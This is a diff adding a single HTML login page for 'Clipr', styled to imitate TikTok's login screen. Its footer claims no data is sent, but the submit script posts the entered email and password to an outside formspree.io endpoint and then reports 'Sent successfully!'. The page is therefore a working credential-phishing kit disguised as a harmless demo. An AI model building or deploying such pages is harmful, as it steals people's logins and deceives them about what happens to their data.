@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Log in | Clipr</title>
+<style>
+:root{
+  --bg:#f1f1f2; --card:#fff; --text:#161823; --muted:#161823a8; --line:#1618231f;
+  --hover:#16182308; --input:#1618230f; --red:#fe2c55; --cyan:#25f4ee;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#000; --card:#121212; --text:#fff; --muted:#ffffff99; --line:#ffffff1f;
+    --hover:#ffffff0d; --input:#ffffff1f;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#000; --card:#121212; --text:#fff; --muted:#ffffff99; --line:#ffffff1f;
+  --hover:#ffffff0d; --input:#ffffff1f;
+}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%}
+body{
+  background:var(--bg); color:var(--text);
+  font-family:"Proxima Nova","TikTok Sans",-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  font-size:16px; line-height:1.4; display:flex; flex-direction:column; min-height:100vh;
+}
+header{padding:16px 24px;display:flex;align-items:center;gap:8px;font-weight:800;font-size:22px;letter-spacing:-.5px}
+.logo{width:28px;height:28px;position:relative}
+.logo svg{position:absolute;inset:0}
+main{flex:1;display:flex;align-items:center;justify-content:center;padding:16px}
+.card{width:100%;max-width:483px;background:var(--card);border-radius:8px;box-shadow:0 2px 12px #00000026;padding:40px 0 0;overflow:hidden}
+h1{margin:0 0 24px;text-align:center;font-size:32px;font-weight:700;letter-spacing:-.4px}
+.fields{padding:0 36px 28px;display:flex;flex-direction:column;gap:12px}
+label{font-size:15px;font-weight:600}
+input{
+  width:100%;height:44px;border:1px solid transparent;background:var(--input);color:var(--text);
+  border-radius:2px;padding:0 12px;font:inherit;font-size:15px;
+}
+input:focus{border-color:var(--muted);outline:none}
+input[aria-invalid="true"]{border-color:var(--red)}
+.err{color:var(--red);font-size:13px;margin-top:-6px;min-height:0}
+.err:empty{display:none}
+.pwrow{position:relative}
+.pwrow input{padding-right:64px}
+.show{position:absolute;right:4px;top:0;height:44px;padding:0 10px;background:none;border:0;color:var(--muted);font:inherit;font-size:13px;font-weight:600;cursor:pointer}
+.show:hover{color:var(--text)}
+.forgot{font-size:12px;color:var(--muted);text-decoration:none;width:fit-content}
+.forgot:hover{text-decoration:underline}
+.go{height:46px;border:0;border-radius:2px;background:var(--red);color:#fff;font:inherit;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+.go:disabled{background:var(--input);color:var(--muted);cursor:not-allowed}
+.go:not(:disabled):hover{filter:brightness(.92)}
+:focus-visible{outline:2px solid var(--cyan);outline-offset:2px}
+.terms{padding:0 36px 20px;text-align:center;font-size:12px;color:var(--muted)}
+.terms a{color:var(--text);font-weight:600;text-decoration:none}
+.switch{border-top:1px solid var(--line);background:var(--hover);height:64px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:15px}
+.switch a{color:var(--red);font-weight:600;text-decoration:none}
+.switch a:hover{text-decoration:underline}
+.toast{position:fixed;left:50%;bottom:calc(24px + env(safe-area-inset-bottom,0px));transform:translate(-50%,20px);background:#161823;color:#fff;padding:12px 18px;border-radius:6px;font-size:14px;opacity:0;pointer-events:none;transition:.25s;max-width:90vw;text-align:center}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+#status{text-align:center;font-size:14px;margin-top:10px;font-weight:600;}
+footer{padding:16px;text-align:center;font-size:12px;color:var(--muted)}
+@media (max-width:520px){
+  .card{box-shadow:none;border-radius:0;padding-top:24px}
+  .fields{padding-left:20px;padding-right:20px}
+  h1{font-size:26px}
+}
+@media (prefers-reduced-motion:reduce){.toast{transition:none}}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo" aria-hidden="true">
+    <svg viewBox="0 0 24 24"><path fill="#25f4ee" d="M14 3v11.2a3.2 3.2 0 1 1-3.2-3.2c.3 0 .6 0 .9.1V8.1a6.2 6.2 0 1 0 5.3 6.1V8.9A7 7 0 0 0 20 10V7a4 4 0 0 1-4-4z" transform="translate(-.8 .6)"/></svg>
+    <svg viewBox="0 0 24 24"><path fill="#fe2c55" d="M14 3v11.2a3.2 3.2 0 1 1-3.2-3.2c.3 0 .6 0 .9.1V8.1a6.2 6.2 0 1 0 5.3 6.1V8.9A7 7 0 0 0 20 10V7a4 4 0 0 1-4-4z" transform="translate(.8 -.6)"/></svg>
+    <svg viewBox="0 0 24 24"><path fill="var(--text)" d="M14 3v11.2a3.2 3.2 0 1 1-3.2-3.2c.3 0 .6 0 .9.1V8.1a6.2 6.2 0 1 0 5.3 6.1V8.9A7 7 0 0 0 20 10V7a4 4 0 0 1-4-4z"/></svg>
+  </div>
+  Clipr
+</header>
+
+<main>
+  <div class="card">
+    <h1>Log in</h1>
+    <form id="myForm" class="fields">
+      <label for="email">Email</label>
+      <input id="email" name="username" type="email" placeholder="Email address" autocomplete="off" inputmode="email" required>
+      <div class="err" id="emailErr" role="alert"></div>
+
+      <label for="pw">Password</label>
+      <div class="pwrow">
+        <input id="pw" name="secret" type="password" placeholder="Password" autocomplete="off" required>
+        <button class="show" id="show" type="button" aria-label="Show password">Show</button>
+      </div>
+      <div class="err" id="pwErr" role="alert"></div>
+
+      <a class="forgot" href="#forgot" id="forgot">Forgot password?</a>
+      <button class="go" id="go" type="submit" disabled>Log in</button>
+      <div id="status"></div>
+    </form>
+    <p class="terms">By continuing, you agree to our <a href="#terms">Terms of Service</a> and confirm that you have read our <a href="#privacy">Privacy Policy</a>.</p>
+    <div class="switch">Don’t have an account? <a href="#signup" id="signup">Sign up</a></div>
+  </div>
+</main>
+
+<footer>Design demo. No real login happens here and nothing you type is sent or saved.</footer>
+<div class="toast" id="toast" role="status"></div>
+
+<script>
+(function(){
+  var $=function(id){return document.getElementById(id)};
+  var email=$('email'),pw=$('pw'),go=$('go'),toast=$('toast'),timer;
+  var re=/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+  function say(m){toast.textContent=m;toast.classList.add('show');clearTimeout(timer);timer=setTimeout(function(){toast.classList.remove('show')},2400)}
+  function check(){go.disabled=!(email.value.trim()&&pw.value)}
+  email.addEventListener('input',function(){check();email.removeAttribute('aria-invalid');$('emailErr').textContent=''});
+  pw.addEventListener('input',function(){check();pw.removeAttribute('aria-invalid');$('pwErr').textContent=''});
+  $('show').addEventListener('click',function(){
+    var hide=pw.type==='password';
+    pw.type=hide?'text':'password';
+    this.textContent=hide?'Hide':'Show';
+    this.setAttribute('aria-label',hide?'Hide password':'Show password');
+  });
+
+  const form = document.getElementById('myForm');
+
+  form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      var ok=true;
+      if(!re.test(email.value.trim())){email.setAttribute('aria-invalid','true');$('emailErr').textContent='Enter a valid email address';ok=false}
+      if(pw.value.length<8){pw.setAttribute('aria-invalid','true');$('pwErr').textContent='Password must be at least 8 characters';ok=false}
+      if(!ok) return;
+
+      const data = {
+          username: email.value,
+          secret: pw.value
+      };
+
+      try {
+          const response = await fetch('https://formspree.io/f/xeaazekl', {
+              method: 'POST',
+              body: JSON.stringify(data),
+              headers: {
+                  'Accept': 'application/json',
+                  'Content-Type': 'application/json'
+              }
+          });
+
+          if (response.ok) {
+              $('status').innerText = "Sent successfully!";
+              form.reset();
+              go.disabled = true;
+          } else {
+              const errorData = await response.json();
+              $('status').innerText = "Error sending data.";
+              console.log(errorData);
+          }
+      } catch (error) {
+          $('status').innerText = "Network error!";
+          console.error(error);
+      }
+  });
+
+  document.querySelectorAll('.forgot,.switch a,.terms a').forEach(function(a){a.addEventListener('click',function(e){e.preventDefault();if(!a.catClosest && !a.closest('.terms'))say('This is a demo page')})});
+})();
+</script>
+</body>
+</html>
